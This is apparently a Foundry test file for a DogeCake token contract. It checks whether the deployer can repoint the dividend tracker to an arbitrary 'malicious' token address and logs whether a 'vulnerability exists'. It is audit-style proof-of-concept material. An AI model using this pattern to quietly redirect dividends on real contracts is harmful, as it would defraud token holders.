// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DogeCake.sol";

contract MockUniswapV2Factory {
    function createPair(address, address) external pure returns (address) {
        return address(0xAABBCCDD);
    }
}

contract MockUniswapV2Router {
    address public immutable factory;
    address public immutable WETH;
    
    constructor() {
        factory = address(new MockUniswapV2Factory());
        WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    }
}

contract DogeCakePrivilegeEscalationTest is Test {
    DogeCake token;
    CakeDividendTracker cakeTracker;
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant DEPLOYER = 0x36feef39B9Ea12FFD0e56B1fB5f3edB1732E8e15;
    address constant MALICIOUS_TOKEN = address(0xDEAD);
    address constant INITIAL_TOKEN = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;

    function setUp() public {
        // Deploy mock router and override the hardcoded address
        MockUniswapV2Router mockRouter = new MockUniswapV2Router();
        vm.etch(ROUTER_ADDRESS, address(mockRouter).code);
        
        // Create token instance with mock dependencies
        vm.startPrank(DEPLOYER);
        token = new DogeCake();
        cakeTracker = CakeDividendTracker(payable(token.cakeDividendTracker()));
        vm.stopPrank();
    }

    function testMaliciousDividendTokenChange() public {
        console.log("--- BEFORE-Trigger dividend token ---");
        address currentToken = cakeTracker.dividendToken();
        console.log("CAKE dividend token before: %s", currentToken);
        assertEq(currentToken, INITIAL_TOKEN, "Initial token mismatch");

        console.log("--- Trigger updateCakeDividendToken ---");
        vm.prank(DEPLOYER);
        token.updateCakeDividendToken(MALICIOUS_TOKEN);

        console.log("--- AFTER-Trigger dividend token ---");
        address newToken = cakeTracker.dividendToken();
        console.log("CAKE dividend token after: %s", newToken);

        // State change analysis
        if (currentToken != newToken && newToken == MALICIOUS_TOKEN) { 
            console.log("State change: Malicious dividend token set as CAKE");
            console.log("Vulnerability Exists: Malicious DIV token set");
        } else if (currentToken != newToken) {
            console.log("Token changed but to unexpected address");
            console.log("Vulnerability not Exist: Unexpected token set");
        } else {
            console.log("Vulnerability not Exist: Token unchanged");
        }
    }
}